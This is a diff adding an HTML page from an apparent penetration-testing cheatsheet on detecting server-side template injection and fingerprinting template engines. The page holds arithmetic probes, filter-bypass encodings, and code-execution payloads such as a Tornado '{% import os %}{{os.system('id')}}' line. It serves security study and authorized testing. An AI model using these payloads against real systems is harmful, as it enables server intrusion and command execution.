@@ -1,0 +1,194 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Detection &amp; Fingerprinting · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>Detection &amp; Fingerprinting</h1><p class="cx-lede">Polyglot probes that distinguish SSTI from XSS or template-string substitution, and engine-fingerprinting payloads that narrow which template engine is in use.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190</span><span class="cx-tag">D3FEND D3-EAL</span><span class="cx-tag">IMPACT ServerSideEval</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Two questions, two probes:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Is the input evaluated as template syntax (vs. string-substituted)?
+{{7*7}}                # SSTI: returns 49.  String sub: returns &quot;{{7*7}}&quot;.
+
+# 2. Which engine?
+{{7*&#x27;7&#x27;}}              # Jinja2: &#x27;7777777&#x27;.  Twig: 49.</code></pre></figure>
+<p>Two probes, three outcomes:
+- <code>{{7*7}}</code> unchanged → not Jinja-family. Try <code>${7*7}</code>, <code>&lt;%= 7*7 %&gt;</code>, <code>@(7*7)</code> next.
+- <code>{{7*7}}</code> → <code>49</code>, <code>{{7*'7'}}</code> → <code>7777777</code> → Jinja2 (Python-side).
+- <code>{{7*7}}</code> → <code>49</code>, <code>{{7*'7'}}</code> → <code>49</code> → Twig (PHP-side).</p>
+<h2 id="polyglot-probes">Polyglot probes</h2>
+<p>The probe below covers six common engines in one string. Submit it once - the output tells you which engines saw it and which didn't:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>${{&lt;%[%&#x27;&quot;}}%\</code></pre></figure>
+<p>The malformed mix triggers parser errors in template engines that interpret any of those delimiters - Jinja2 throws a TemplateSyntaxError, Twig logs a Twig_Error, Freemarker logs a ParseException, etc. The exact error message often names the engine in the traceback.</p>
+<p>If error responses are suppressed, fall back to the per-syntax probes below.</p>
+<h3 id="per-syntax-arithmetic-probes">Per-syntax arithmetic probes</h3>
+<table>
+<thead>
+<tr>
+<th>Syntax</th>
+<th>Engine families</th>
+<th>Probe</th>
+<th>Returns on hit</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>{{ ... }}</code></td>
+<td>Jinja2 / Twig / Nunjucks / Handlebars</td>
+<td><code>{{7*7}}</code></td>
+<td><code>49</code></td>
+</tr>
+<tr>
+<td><code>${ ... }</code></td>
+<td>Freemarker / Velocity / Thymeleaf (<code>th:text</code>)</td>
+<td><code>${7*7}</code></td>
+<td><code>49</code></td>
+</tr>
+<tr>
+<td><code>&lt;%= ... %&gt;</code></td>
+<td>ERB / EJS / JSP <code>&lt;%=</code></td>
+<td><code>&lt;%= 7*7 %&gt;</code></td>
+<td><code>49</code></td>
+</tr>
+<tr>
+<td><code>#{ ... }</code></td>
+<td>Pug / Ruby <code>#{}</code> interp / Slim</td>
+<td><code>#{7*7}</code></td>
+<td><code>49</code></td>
+</tr>
+<tr>
+<td><code>@( ... )</code></td>
+<td>Razor</td>
+<td><code>@(7*7)</code></td>
+<td><code>49</code></td>
+</tr>
+<tr>
+<td><code>[[ ... ]]</code></td>
+<td>Smarty (alt delim)</td>
+<td><code>[[7*7]]</code></td>
+<td><code>49</code></td>
+</tr>
+<tr>
+<td><code>{ ... }</code></td>
+<td>Smarty (default), Mustache (limited)</td>
+<td><code>{7*7}</code></td>
+<td><code>49</code></td>
+</tr>
+</tbody>
+</table>
+<p>If none of the arithmetic probes evaluate, it's almost certainly not SSTI - the input is being string-substituted or escaped before reaching any template engine.</p>
+<h3 id="common-false-positives">Common false positives</h3>
+<p>A few patterns look like SSTI hits but aren't:</p>
+<ul>
+<li><strong><code>{{7*7}}</code> returns <code>7*7</code> literally, not <code>{{7*7}}</code></strong> - the delimiters were stripped by a template engine that DIDN'T evaluate the expression. This means there's a templating layer, but expressions are being treated as variable names that don't exist. Sometimes you can still escape - try <code>{{7}}{{7}}</code> to see if <code>7</code> evaluates.</li>
+<li><strong><code>{{7*7}}</code> returns the rendered HTML page with <code>49</code> somewhere</strong> - check whether <code>49</code> is in <em>your</em> reflection point or somewhere else on the page. A coincidence is possible if the page already contains the number 49.</li>
+<li><strong><code>&lt;%= 7*7 %&gt;</code> returns <code>49</code> but only in a downloaded file</strong> (PDF, CSV) - sink is in a templated report generator, not in HTML. Still SSTI, just a less interactive testing loop.</li>
+</ul>
+<h2 id="engine-identification-disambiguation-matrix">Engine identification - disambiguation matrix</h2>
+<p>Once <code>{{7*7}}</code> or <code>${7*7}</code> evaluates, narrow to a specific engine. Run probes in order; first divergence wins.</p>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">`{{...}}` family - Jinja2 vs Tornado vs Twig vs Nunjucks vs Handlebars</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{7*&#x27;7&#x27;}}</code></pre></figure>
+<ul>
+<li>Jinja2 (Python) → <code>7777777</code> - string-multiply semantics</li>
+<li>Tornado (Python) → <code>7777777</code> - same string-multiply semantics as Jinja2</li>
+<li>Twig (PHP) → <code>49</code> - numeric coercion</li>
+<li>Nunjucks (Node) → <code>49</code> - numeric coercion</li>
+<li>Handlebars (Node) → error or unchanged - Handlebars doesn't do arithmetic</li>
+</ul>
+<p>The two Python engines (Jinja2, Tornado) are indistinguishable on <code>{{7*'7'}}</code>. Split them with a Python <code>import</code> - Tornado's <code>{% import %}</code> imports modules, Jinja2's imports templates and throws on a module name:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{% import os %}{{os.getcwd()}}</code></pre></figure>
+<ul>
+<li>Tornado → a filesystem path (the working directory)</li>
+<li>Jinja2 → error (<code>{% import %}</code> expects a template, not <code>os</code>)</li>
+</ul>
+<p>Then to split Twig vs Nunjucks (both returned <code>49</code>):</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{request}}</code></pre></figure>
+<ul>
+<li>Twig → dumps the Symfony Request object (<code>HTTP request</code>)</li>
+<li>Nunjucks → empty or <code>undefined</code> (no global <code>request</code> symbol)</li>
+</ul>
+<p>Or the surest tell - try a constructor expression:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>{{ &quot;&quot;.__class__ }}                # Python family (Jinja2 OR Tornado): &lt;class &#x27;str&#x27;&gt;
+{{ _self }}                       # Twig: object dump of __TwigTemplate_...
+{{ range }}                       # Nunjucks: [object Function]
+{{ handler }}                     # Tornado: RequestHandler object (when sink is a handler)</code></pre></figure>
+<p>A frequent dead-end worth recognizing: <code>{{7*7}}</code> and <code>{{7*'7'}}</code> both evaluate (Python family), but every Jinja2-specific payload (<code>{{config}}</code>, <code>{{self}}</code>, the <code>__class__</code> walk) returns <code>500</code>. That is the Tornado signature - stop trying Jinja2 payloads and switch to <code>{% import os %}{{os.system('id')}}</code>. See <a href="../tornado/index.html">Tornado</a>.</p>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">`${...}` family - Freemarker vs Velocity vs Thymeleaf</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>${7*7}</code></pre></figure>
+<p>If <code>49</code> returns, run:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;#assign x=7&gt;${x}</code></pre></figure>
+<ul>
+<li>Freemarker → <code>7</code> (the <code>&lt;#assign&gt;</code> directive succeeded)</li>
+<li>Velocity → error or unchanged (no <code>&lt;#...&gt;</code> syntax)</li>
+</ul>
+<p>Velocity uses <code>#set( $x = 7 )$x</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>#set($x=7)$x</code></pre></figure>
+<ul>
+<li>Velocity → <code>7</code></li>
+<li>Freemarker → unchanged or error</li>
+</ul>
+<p>Thymeleaf typically appears with the <code>th:</code> namespace in HTML attributes (<code>th:text="${7*7}"</code>) - if the reflection is in a regular HTML body and <code>${7*7}</code> evaluates, it's much more likely Freemarker or Velocity than Thymeleaf.</p>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label"></p>
+<p>` family - ERB vs EJS vs JSP"&gt;</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;%= 7*7 %&gt;</code></pre></figure>
+<p>If <code>49</code> returns, the runtime stack identifies the engine:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;%= File %&gt;                       # ERB: returns &lt;File&gt; class object
+&lt;%= process.version %&gt;            # EJS: returns Node.js version string like &#x27;v18.17.0&#x27;
+&lt;%= request.getMethod() %&gt;        # JSP: returns &#x27;GET&#x27;/&#x27;POST&#x27;</code></pre></figure>
+<p>The cleanest disambiguation - one of those three will work; the others will throw or return unchanged.</p>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">`@(...)` Razor / ASP.NET</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>@(7*7)</code></pre></figure>
+<p>returns <code>49</code> on Razor. Confirm with:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>@System.Environment.MachineName</code></pre></figure>
+<p>returns the server hostname. No other common engine accepts the <code>@(...)</code> syntax, so a single hit is usually enough.</p>
+</div>
+</div>
+<h2 id="probing-through-filters">Probing through filters</h2>
+<p>Some applications strip <code>{{</code>, <code>${</code>, or <code>&lt;%</code> outright. A few approaches:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Whitespace inside delimiters
+{{ 7*7 }}                          # still works, but most filters catch this too
+{ {7*7} }                          # broken - delimiters split
+
+# Comment-fenced probes (engines that support comments)
+{#- 7*7 -#}                        # Jinja2 comment - tests engine presence
+{%- if 7*7 %}YES{%- endif %}       # Jinja2 statement block
+
+# Alternate delimiters (configurable in some engines)
+&lt;% if 7*7 %&gt;YES&lt;% endif %&gt;         # if engine uses &lt;% as alt
+[[7*7]]                            # if Smarty was configured with alt delims
+
+# Encoded
+%7B%7B7*7%7D%7D                    # URL-encoded {{7*7}}
+&amp;#x7b;&amp;#x7b;7*7&amp;#x7d;&amp;#x7d;        # HTML entity {{7*7}}
+\u007b\u007b7*7\u007d\u007d        # Unicode escape in JSON contexts</code></pre></figure>
+<p>If <code>{{</code> and <code>${</code> are both stripped, but the reflection still looks suspicious, check whether the application is using an unusual engine - Pug (<code>#{...}</code>), Slim, or Razor (<code>@(...)</code>) won't be caught by the obvious filters.</p>
+<h2 id="output-channel-detection">Output-channel detection</h2>
+<p>Not every SSTI sink reflects to the screen. Probes that work where direct reflection doesn't:</p>
+<ul>
+<li><strong>Email body</strong> - submit <code>{{7*7}}</code> in the field, trigger the email, read it. Common in "share / invite" features.</li>
+<li><strong>PDF/CSV report</strong> - submit probe, download the generated report. Templated reports frequently SSTI when the HTML view doesn't.</li>
+<li><strong>Webhook payload</strong> - submit probe in a field that becomes part of an outgoing webhook. Inspect the receiving side (your <code>&lt;COLLAB&gt;</code> host).</li>
+<li><strong>Admin notification</strong> - probe in a user-facing field, trigger an action that emails an admin. Admin's mail client renders it.</li>
+<li><strong>Logs/dashboard</strong> - some monitoring tools render log content as templates in their UI. Probe via a log-producing action.</li>
+</ul>
+<p>Output-channel SSTI is high-value because filters in those paths are weaker than the HTML rendering path. The same input that's HTML-escaped on the web page might be raw in the PDF.</p>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>The slowest part of detection is waiting for the email or report to arrive. If the application has a "preview" feature for templated content, use it - the preview almost always evaluates the same template the production path uses, and you get an answer in milliseconds instead of minutes.</p>
+</div>
+<h2 id="when-detection-fails">When detection fails</h2>
+<p>A confirmed SSTI is unusually distinctive - the arithmetic-eval signal is hard to fake. If every probe returns unchanged across every syntax family, it's almost certainly not SSTI. Switch to:</p>
+<ul>
+<li><strong>Reflected XSS</strong> if the reflection appears in HTML context unescaped → web XSS pages</li>
+<li><strong>SQL/Command injection</strong> if the input ends up in a query or shell command → other web pages</li>
+<li><strong>SSRF</strong> if the input is a URL-shaped field → <a href="../../ssrf/index.html">SSRF</a></li>
+</ul>
+<p>Don't spend more than five minutes probing for SSTI in a field where every probe returns unchanged. The signal-to-noise ratio is too good for prolonged speculation.</p></article><nav class="cx-pager"><a class="cx-prev" href="../../index.html">Previous: Server-Side Attacks</a><a class="cx-next" href="../../includes/esi/index.html">Next: ESI Injection</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
